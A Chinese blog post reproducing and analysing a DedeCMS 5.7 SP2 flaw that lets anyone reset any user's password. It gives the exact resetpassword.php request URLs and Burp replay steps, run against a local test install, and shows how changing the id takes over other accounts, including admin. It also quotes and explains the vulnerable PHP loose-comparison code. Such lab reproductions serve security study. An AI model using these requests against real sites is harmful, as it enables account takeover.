---
title: dedecms5.7 sp2前台修改任意用户密码漏洞复现
date: 2021-11-22 22:22:11
tags:  漏洞复现
cover: https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-83rezk_1920x1080.png
---

#  dedecms5.7 sp2前台修改任意用户密码漏洞复现

![20200708203502702](https://img-blog.csdnimg.cn/20200708203502702.gif)



##  复现前的准备

下载dedecms5.7 sp2,本人复现用的是UTF8版本的。

[传送门](https://www.xiuzhanwang.com/dedecms_az/1749.html)

![image-20211122223938824](https://raw.githubusercontent.com/todis21/image/main/img/image-20211122223938824.png)

##  工具

phpstudy
burp Suite

##  复现过程

首先在本地搭建这个cms,使用phpstudy

把解压后的文件丢进phpstudy的www目录下，可改一下文件夹名，这里改成了dedecms

![image-20211122225526149](https://raw.githubusercontent.com/todis21/image/main/img/image-20211122225526149.png)

根据文件下的docs/readme.txt的要求配置环境，然后打开服务，根据提示进行安装

![image-20211122224739581](https://raw.githubusercontent.com/todis21/image/main/img/image-20211122224739581.png)



安装事需要到数据库，直接在phpstudy创建

![image-20211122225037921](https://raw.githubusercontent.com/todis21/image/main/img/image-20211122225037921.png)



安装成功后进入后台/dedecms/uploads/dede/index.php，进行如下设置

![image-20211122230017391](https://raw.githubusercontent.com/todis21/image/main/img/image-20211122230017391.png)

然后访问/dedecms/uploads/member/index.php点击注册

这里注册两个账号（不要设置安全问题）



受害用户  text/123456

攻击者   hacher/123456

![image-20211122230934064](https://raw.githubusercontent.com/todis21/image/main/img/image-20211122230934064.png)

站在攻击者的角度，攻击者是不知道受害用户的密码的，现在的目的是登录受害用户的账号

现在先登录攻击者账号再将URL中member后的内容改为resetpassword.php?dopost=safequestion&safequestion=0.0&safeanswer=&id=3

上图的mid即为id,hacker账号的mid为3，所以url后面填写id=3 

![image-20211122230838209](https://raw.githubusercontent.com/todis21/image/main/img/image-20211122230838209.png)



访问http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=safequestion&safequestion=0.0&safeanswer=&id=3

用burp Suite抓包，我在chrome浏览器抓不到本地的包，所以转用火狐，火狐抓本地的包需要改一些设置[传送门](https://blog.csdn.net/XavierDarkness/article/details/91410910)

抓到包后发给repeater,进行重放

![image-20211122232233520](https://raw.githubusercontent.com/todis21/image/main/img/image-20211122232233520.png)



把id改一下，要不得不到红圈得链接

http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=getpasswd&amp;id=2&amp;key=f2O1mLr8

把没用得参数`amp;`去除，得到

http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=getpasswd&id=2&key=f2O1mLr8

直接访问这个链接就可以改密码了

![image-20211122232631788](https://raw.githubusercontent.com/todis21/image/main/img/image-20211122232631788.png)

修改密码后成功登录

![image-20211122232855916](https://raw.githubusercontent.com/todis21/image/main/img/image-20211122232855916.png)

把http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=getpasswd&id=2&key=f2O1mLr8的id的值改成其他的，就能改其他其他用户的密码了，包括admin（id=1）

![image-20211122233053082](https://raw.githubusercontent.com/todis21/image/main/img/image-20211122233053082.png)

复现结束。



##  漏洞分析

刚刚使用的payload是`http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=getpasswd&id=2&key=f2O1mLr8` 

可以看出该漏洞出现在member目录下的resetpassword.php文件里

根据网上的分析，出现漏洞的原因是`前台resetpassword.php中对接受的safeanswer参数类型比较不够严格，遭受弱类型比较攻击`

打开文件，查看漏洞出现位置

![image-20211123210547435](https://raw.githubusercontent.com/todis21/image/main/img/image-20211123210547435.png)

我们构造payload时有dopost=getpasswd

所以能够满足`$dopost=="safequestion"`,进入了下面的赋值和判断

```
if(empty($safequestion)) $safequestion = '';
if(empty($safeanswer)) $safeanswer = '';
if($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer)
    {
        sn($mid, $row['userid'], $row['email'], 'N');
        exit();
    }
    else
    {
        ShowMsg("对不起，您的安全问题或答案回答错误","-1");
        exit();
    }
```

就是这里的判断出现了问题，由网上的文章了解到在dedecms的数据库中，如果用户没有设置安全问题则数据库里存储的safequestion默认为"0"，safeanswer默认为’null’。因为在PHP的弱比较中`''和NULL`的比较返回的是true

![image-20211123213118407](https://raw.githubusercontent.com/todis21/image/main/img/image-20211123213118407.png)





因为使用了不够严谨的 == 进行了比较，两个等号是弱比较，导致if语句的条件为真，就会进入分支，进入sn函数

sn函数位置`/member/inc/inc_pwd_functions.php(150行)`

```
function sn($mid,$userid,$mailto, $send = 'Y')
{
    global $db;
    $tptim= (60*10);
    $dtime = time();
    $sql = "SELECT * FROM #@__pwd_tmp WHERE mid = '$mid'";
    $row = $db->GetOne($sql);
    if(!is_array($row))
    {
        //发送新邮件；
        newmail($mid,$userid,$mailto,'INSERT',$send);
    }
    //10分钟后可以再次发送新验证码；
    elseif($dtime - $tptim > $row['mailtime'])
    {
        newmail($mid,$userid,$mailto,'UPDATE',$send);
    }
    //重新发送新的验证码确认邮件；
    else
    {
        return ShowMsg('对不起，请10分钟后再重新申请', 'login.php');
    }
}
```

在sn函数内部，会根据id到pwd_tmp表中判断是否存在对应的临时密码记录，根据结果确定分支，走向newmail函数

newmail函数位置`member/inc/inc_pwd_functions.php(73行)`

```
function newmail($mid, $userid, $mailto, $type, $send)
{
    global $db,$cfg_adminemail,$cfg_webname,$cfg_basehost,$cfg_memberurl;
    $mailtime = time();
    $randval = random(8);
    $mailtitle = $cfg_webname.":密码修改";
    $mailto = $mailto;
    $headers = "From: ".$cfg_adminemail."\r\nReply-To: $cfg_adminemail";
    $mailbody = "亲爱的".$userid."：\r\n您好！感谢您使用".$cfg_webname."网。\r\n".$cfg_webname."应您的要求，重新设置密码：（注：如果您没有提出申请，请检查您的信息是否泄漏。）\r\n本次临时登陆密码为：".$randval." 请于三天内登陆下面网址确认修改。\r\n".$cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&id=".$mid;
    if($type == 'INSERT')
    {
        $key = md5($randval);
        $sql = "INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES ('$mid', '$userid',  '$key', '$mailtime');";
        if($db->ExecuteNoneQuery($sql))
        {
            if($send == 'Y')
            {
                sendmail($mailto,$mailtitle,$mailbody,$headers);
                return ShowMsg('EMAIL修改验证码已经发送到原来的邮箱请查收', 'login.php','','5000');
            } else if ($send == 'N')
            {
                return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&amp;id=".$mid."&amp;key=".$randval);
            }
        }
        else
        {
            return ShowMsg('对不起修改失败，请联系管理员', 'login.php');
        }
    }
    elseif($type == 'UPDATE')
    {
        $key = md5($randval);
        $sql = "UPDATE `#@__pwd_tmp` SET `pwd` = '$key',mailtime = '$mailtime'  WHERE `mid` ='$mid';";
        if($db->ExecuteNoneQuery($sql))
        {
            if($send == 'Y')
            {
                sendmail($mailto,$mailtitle,$mailbody,$headers);
                ShowMsg('EMAIL修改验证码已经发送到原来的邮箱请查收', 'login.php');
            }
            elseif($send == 'N')
            {
                return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&amp;id=".$mid."&amp;key=".$randval);
            }
        }
        else
        {
            ShowMsg('对不起修改失败，请与管理员联系', 'login.php');
        }
    }
}
```

进入newmail函数后，会因为$type的值进入$type == 'INSERT'这个分支，然后因为($send == 'N')这个条件为真，通过ShowMsg打印出修改密码的连接，导致漏洞形成



整个过程大概就是酱紫了，收工。

